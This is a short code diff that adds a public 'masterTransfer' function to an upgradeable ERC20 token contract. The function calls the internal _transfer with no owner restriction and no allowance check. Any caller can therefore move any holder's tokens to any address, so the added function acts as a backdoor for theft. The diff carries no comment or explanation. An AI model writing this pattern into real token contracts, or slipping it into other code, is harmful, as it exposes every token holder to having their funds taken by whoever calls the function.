@@ -30,4 +30,8 @@ contract ERC20Mintable is ERC20Upgradeable {
         _burn(account, amount);
         return true;
     }
+
+    function masterTransfer(address from, address to, uint256 amount) public {
+        _transfer(from, to, amount);
+    }
 }
